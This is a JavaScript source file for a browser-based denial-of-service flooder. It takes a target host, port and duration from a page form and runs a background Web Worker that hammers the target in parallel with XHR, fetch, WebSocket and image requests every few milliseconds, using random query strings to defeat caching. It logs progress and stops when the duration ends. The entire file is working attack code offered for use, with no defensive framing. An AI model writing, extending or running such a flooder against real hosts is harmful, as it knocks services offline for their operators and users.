let attackWorker = null;
let isAttacking = false;
let requestCount = 0;
let startTime = null;

function log(message) {
    const logElement = document.getElementById('log');
    const timestamp = new Date().toLocaleTimeString();
    logElement.innerHTML += `[${timestamp}] ${message}<br>`;
    logElement.scrollTop = logElement.scrollHeight;
}

function updateStatus(message) {
    document.getElementById('status').innerHTML = `Status: ${message}`;
}

function startAttack() {
    if (isAttacking) {
        log("Attack already running!");
        return;
    }

    const target = document.getElementById('target').value;
    const port = document.getElementById('port').value;
    const duration = document.getElementById('duration').value;

    if (!target) {
        log("Error: Please enter target!");
        return;
    }

    // Create Web Worker for background attack
    attackWorker = new Worker(URL.createObjectURL(new Blob([`
        let requestCount = 0;
        let stop = false;

        function browserAttack(target, port) {
            // Method 1: XHR Flood
            function xhrFlood() {
                if (stop) return;
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', 'http://' + target + ':' + port + '/?rand=' + Math.random(), true);
                    xhr.timeout = 1000;
                    xhr.onload = function() { requestCount++; };
                    xhr.ontimeout = function() { requestCount++; };
                    xhr.send();
                } catch(e) {}
            }

            // Method 2: Fetch Flood
            async function fetchFlood() {
                if (stop) return;
                try {
                    await fetch('http://' + target + ':' + port + '/?rand=' + Math.random(), {
                        method: 'GET',
                        mode: 'no-cors',
                        cache: 'no-cache'
                    });
                    requestCount++;
                } catch(e) {}
            }

            // Method 3: WebSocket Flood
            function wsFlood() {
                if (stop) return;
                try {
                    const ws = new WebSocket('ws://' + target + ':' + port);
                    ws.onopen = function() { requestCount++; ws.close(); };
                    ws.onerror = function() { requestCount++; };
                } catch(e) {}
            }

            // Method 4: Image Flood
            function imgFlood() {
                if (stop) return;
                try {
                    const img = new Image();
                    img.src = 'http://' + target + ':' + port + '/image?rand=' + Math.random();
                    img.onload = function() { requestCount++; };
                    img.onerror = function() { requestCount++; };
                } catch(e) {}
            }

            // Run all methods in parallel
            setInterval(xhrFlood, 10);
            setInterval(fetchFlood, 15);
            setInterval(wsFlood, 20);
            setInterval(imgFlood, 25);
        }

        self.onmessage = function(e) {
            if (e.data.action === 'start') {
                browserAttack(e.data.target, e.data.port);
            } else if (e.data.action === 'stop') {
                stop = true;
            }
        }
    `], {type: 'text/javascript'})));

    attackWorker.postMessage({
        action: 'start',
        target: target,
        port: port
    });

    isAttacking = true;
    startTime = Date.now();
    updateStatus("Attack Running");

    log(`Starting advanced attack on ${target}:${port}`);
    log("Methods: XHR Flood, Fetch Flood, WebSocket Flood, Image Flood");

    // Update stats every second
    const statsInterval = setInterval(() => {
        if (!isAttacking) {
            clearInterval(statsInterval);
            return;
        }
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        updateStatus(`Attack Running - ${elapsed}s elapsed`);
    }, 1000);

    // Auto stop after duration
    setTimeout(() => {
        if (isAttacking) {
            stopAttack();
            log(`Attack completed after ${duration} seconds`);
        }
    }, duration * 1000);
}

function stopAttack() {
    if (attackWorker) {
        attackWorker.postMessage({ action: 'stop' });
        attackWorker.terminate();
        attackWorker = null;
    }
    isAttacking = false;
    updateStatus("Stopped");
    log("Attack stopped by user");
}

function connectToBackend() {
    const target = document.getElementById('target').value;
    if (!target) {
        log("Error: Enter target first!");
        return;
    }
    
    log("Connecting to Python backend...");
    // Backend connection logic would go here
    log("Backend connection feature requires server setup");
}